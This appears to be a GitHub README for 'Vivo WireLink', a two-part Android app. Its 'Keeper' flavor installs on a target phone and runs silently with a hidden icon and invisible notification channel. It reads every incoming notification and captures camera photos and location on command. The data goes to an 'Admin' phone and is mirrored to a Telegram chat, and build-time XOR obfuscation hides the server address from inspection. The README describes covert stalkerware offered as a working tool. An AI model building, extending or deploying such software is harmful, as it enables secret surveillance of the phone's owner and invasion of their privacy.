<div align="center">

![Vivo WireLink](https://img.shields.io/badge/vivo-WireLink-415FFF?style=for-the-badge&logo=vivo&logoColor=white)

**Dual-role Android remote telemetry · Go WebSocket broker · Telegram mirror**

[![Release Build](https://img.shields.io/github/actions/workflow/status/realximanta/vivo-wirelink/release.yml?style=for-the-badge&label=release%20build&logo=githubactions&logoColor=white)](https://github.com/realximanta/vivo-wirelink/actions)
[![Latest Release](https://img.shields.io/github/v/release/realximanta/vivo-wirelink?style=for-the-badge&label=release&logo=github&logoColor=white)](https://github.com/realximanta/vivo-wirelink/releases)
[![License](https://img.shields.io/badge/license-private-red?style=for-the-badge&logo=keybase&logoColor=white)](#)

</div>

---

<div align="center">

### Built with

![Android](https://img.shields.io/badge/Android-14%20%7C%2016-3DDC84?style=for-the-badge&logo=android&logoColor=white)
![Kotlin](https://img.shields.io/badge/Kotlin-2.0.21-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)
![Go](https://img.shields.io/badge/Go-1.22-00ADD8?style=for-the-badge&logo=go&logoColor=white)
![Gradle](https://img.shields.io/badge/Gradle-8.11.1-02303A?style=for-the-badge&logo=gradle&logoColor=white)

![Render](https://img.shields.io/badge/deployed%20on-Render-46E3B7?style=for-the-badge&logo=render&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)
![OpenStreetMap](https://img.shields.io/badge/maps-osmdroid-7EB900?style=for-the-badge&logo=openstreetmap&logoColor=white)
![GitHub Actions](https://img.shields.io/badge/CI-GitHub%20Actions-2088FF?style=for-the-badge&logo=githubactions&logoColor=white)

</div>

---

## 🎯 What It Is

One APK, two flavors. **Keeper** installs on a target phone and opens a
persistent WebSocket to a Render-hosted Go broker. **Admin** installs on a
second phone, signs in with a shared password, and pulls location, camera, and
live notifications off the keeper on demand. A Telegram bot mirrors every
capture to a chat.

Nothing is stored on disk. Everything flows live over WSS, and Telegram holds
the paper trail.

---

## 📱 The Two Flavors

<div align="center">

| ![Keeper](https://img.shields.io/badge/%F0%9F%93%B1-KEEPER-000000?style=for-the-badge) | ![Admin](https://img.shields.io/badge/%F0%9F%96%A5%EF%B8%8F-ADMIN-415FFF?style=for-the-badge) |
|:---:|:---:|
| **Target device** | **Control device** |
| `com.vivo.wirelink` | `com.vivo.wirelink.admin` |
| `targetSdk 36` · Android 16 | `targetSdk 34` · Android 14 |
| Foreground service · silent | Drawer layout · map · history |
| Hides launcher icon on demand | Signs in with shared password |
| Reads every incoming notification | Streams results live + Telegram |
| Sits quietly, answers commands | Fires commands at the push of a button |

</div>

---

## 🏗️ Architecture

```
┌──────────────────┐   WSS    ┌──────────────────┐   WSS   ┌──────────────────┐
│  Keeper APK      │ ───────► │  Go broker       │ ──────► │  Admin APK       │
│  (targetSdk 36)  │          │  Render free     │         │  (targetSdk 34)  │
│                  │          │                  │         │                  │
│  - FGS camera    │          │  - /ping         │         │  - map (osmdroid)│
│  - FGS location  │          │  - /api/login    │         │  - photo view    │
│  - Notif relay   │          │  - /ws/keeper    │         │  - history list  │
│  - silent svc    │          │  - /ws/admin     │         │                  │
└──────────────────┘          └────────┬─────────┘         └──────────────────┘
                                       │
                                       ▼
                              ┌──────────────────┐
                              │  Telegram bot    │
                              │  chat 6142816761 │
                              └──────────────────┘
```

---

## 🧩 Stack

- 🐹 **Backend** — Go 1.22+, `gorilla/websocket`, stdlib HTTP
- 🖥️ **Hosting** — Render Web Service, native Go runtime, free tier
- 📱 **Client** — Kotlin, AndroidX, CameraX 1.4.1, Play Services Location 21.3.0
- 🗺️ **Map** — osmdroid 6.1.20 (OpenStreetMap, no API key)
- 🔌 **Networking** — OkHttp 4.12.0 (WS + HTTP)
- ⏰ **Keep-alive** — external cron hitting `HEAD /ping` every 10 min
- 🚀 **CI** — GitHub Actions, release-triggered, Gradle 8.11.1, JDK 17
- 🤖 **Forwarding** — Telegram Bot API

---

## 📁 Repo Layout

```
vivo-wirelink/
├── .github/workflows/release.yml
├── .gitignore
├── README.md
├── SUCCESS.md
├── settings.gradle
├── build.gradle
├── gradle.properties
├── app/
│   ├── build.gradle
│   ├── proguard-rules.pro
│   └── src/main/
│       ├── AndroidManifest.xml
│       ├── java/com/vivo/wirelink/
│       │   ├── MainActivity.kt
│       │   ├── Prefs.kt
│       │   ├── WsClient.kt
│       │   ├── LinkBus.kt
│       │   ├── KeeperActivity.kt
│       │   ├── KeeperService.kt
│       │   ├── NotificationRelay.kt
│       │   ├── AdminActivity.kt
│       │   └── HistoryActivity.kt
│       └── res/
│           ├── layout/
│           ├── drawable/
│           ├── mipmap-anydpi-v26/
│           ├── mipmap-anydpi/
│           └── values/
└── backend/
    ├── go.mod
    ├── main.go
    └── render.yaml
```

---

## 🌐 Backend Endpoints

| Method | Path          | Purpose                                  |
|--------|---------------|------------------------------------------|
| HEAD   | `/ping`       | keep-alive, cron target                  |
| POST   | `/api/login`  | password → token (SHA256 "vivo::"+pw)    |
| WS     | `/ws/keeper`  | keeper socket, `?deviceId=<id>`          |
| WS     | `/ws/admin`   | admin socket, `?token=<token>`           |

---

## ✨ Features

### 📱 Keeper Flavor
- 🔕 Foreground service with **IMPORTANCE_NONE** channel — invisible in drawer
- 📸 On-demand camera capture, front or rear, compressed before send
- 📍 On-demand high-accuracy location
- 🔔 Notification listener — reads every incoming notification from every app
- 🕶️ Launcher icon can be hidden via `setComponentEnabledSetting(DISABLED)`
- 🔋 Battery-optimization exemption button
- 🎯 Notification-access deep link to system settings
- 🗜️ Photos resized to 1280px longest side, JPEG quality 65
- 📡 Event pipeline via `LinkBus` (SharedFlow, decoupled)

### 🖥️ Admin Flavor
- 🔑 Password login → persisted token
- 🗺️ Live map with marker (osmdroid, no key required)
- 📸 Photo preview in scrollable frame below the map
- 📚 History section — 12-hour rolling window
- 🏷️ Filter chips: all / location / camera / notification
- 🖱️ Tap any history row → detail dialog
- 🗺️ Location dialog has "open in maps" intent
- 🚪 Sign out clears token and closes the socket

### 🐹 Backend
- 🔐 Stateless shared-password auth, deterministic token
- 🎯 Keeper registry by deviceId, admin sessions by timestamp
- ↔️ Command relay, fan-out of results to every connected admin
- 🤖 Telegram mirror — photos as multipart, locations via `sendLocation`, notifications as text
- 🔁 Stale keeper sockets evicted on reconnect under same deviceId
- 🧵 Goroutine per Telegram send — WS loop never blocks

### 🤖 Telegram Forwarding
- 📸 Photos → `sendPhoto` with multipart JPEG upload
- 📍 Locations → `sendLocation` plus caption follow-up
- 🔔 Notifications → `sendMessage` with app, title, text, timestamp

---

## 🚀 Deployment

### 🖥️ Render
1. New → Blueprint → connect repo → apply `backend/render.yaml`
2. Set `ADMIN_PASSWORD` when prompted
3. Add `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` in Environment
4. Manual Deploy → Deploy latest commit
5. Verify `https://<service>.onrender.com/ping` returns 200

### ⏰ Keep-Alive
- External cron → `HEAD https://<service>.onrender.com/ping` every 10 minutes
- Keeper's WS ping (OkHttp, 30 s interval) also holds the server warm while running

### 🔑 GitHub Secrets

| Name           | Purpose                                        |
|----------------|------------------------------------------------|
| `BACKEND_URL`  | full Render URL, e.g. `https://x.onrender.com` |
| `XOR_KEY`      | 32+ random chars used for URL camouflage       |

---

## 🏷️ Build Trigger Model

- 🚫 `on: push` — nothing fires on code commits
- 🚫 committing the workflow itself fires nothing
- ✅ **only** `on: release: types: [published]` triggers a build
- 📦 output: `vivo-wirelink-keeper-<tag>.apk` and `vivo-wirelink-admin-<tag>.apk`
- 🎯 both APKs attach to the release automatically

---

## 🔐 URL Camouflage

- 🔒 Backend URL stored in GitHub secrets, never in the repo
- 🧮 Build-time XOR with `XOR_KEY`, then Base64
- 📦 Ciphertext lands in `BuildConfig.BACKEND_URL_ENC`
- 🔓 Decoded at runtime in `Prefs.kt`, cached in a volatile field
- 🚫 No plaintext URL in the APK — `strings` finds nothing
- ⚠️ Obfuscation, not encryption — reverse engineering is still possible, it just defeats casual inspection

---

## 📊 Compression Math

| Stage             | Size        |
|-------------------|-------------|
| Raw 12MP capture  | ~3 MB       |
| After scale+JPEG  | ~150–250 KB |
| Base64 overhead   | +33%        |
| **Wire size**     | **~200–330 KB** |

Effective reduction: **~90%**.

---

## ⚠️ Known Limits

- 🐉 OEM battery killers (Xiaomi, Huawei, Oppo, Vivo, Samsung) can still stop the FGS even with the exemption on
- 📸 Camera LED flashes on every capture — physical, cannot suppress
- 🟢 Green camera/location dot appears during capture — OS-owned
- 🔕 Notification access must be enabled manually by the user
- 💤 Render free tier sleeps at 15 min idle — cron keeps it warm
- 💾 History is in-memory only — cleared when admin app process dies
- 🎯 Admin fires at `keepers.first()` — no multi-keeper picker
- 🔐 Single shared password, no per-admin accounts
- 🖼️ APKs are debug-signed — install sideloaded, not Play-store-ready
- 🤖 Telegram sends are fire-and-forget, no retry on failure

---

## 🧪 Verified Working

- ✅ Backend builds clean on Render native Go runtime
- ✅ Keeper connects, stays connected, survives battery-optimization exemption
- ✅ Location returns lat/lng/accuracy in under 5 s
- ✅ Photos arrive compressed, render in the admin preview
- ✅ Notifications from arbitrary apps land in admin history and Telegram
- ✅ Map renders OSM tiles without an API key
- ✅ History filters and detail dialogs work
- ✅ Telegram bot delivers photos, locations, and text to chat 6142816761
- ✅ Release-tagged builds produce both APKs and attach them to the release

---

## 📌 Version

![App](https://img.shields.io/badge/app-1.2-415FFF?style=flat-square&logo=android&logoColor=white)
![Backend](https://img.shields.io/badge/backend-go%201.22-00ADD8?style=flat-square&logo=go&logoColor=white)
![Status](https://img.shields.io/badge/status-operational-3DDC84?style=flat-square&logo=checkmarx&logoColor=white)

---

## 🎬 Ongoing

Same voice, same repo, more on request:
- 🧩 Multi-keeper picker for admin
- 💾 Persistent history via Cloudflare D1
- 🔐 Real release keystore
- 📊 Command/location history querying

---

<div align="center">

![vivo](https://img.shields.io/badge/vivo-WireLink-415FFF?style=for-the-badge&logo=vivo&logoColor=white)

**The weather is good. The app works.**

</div>
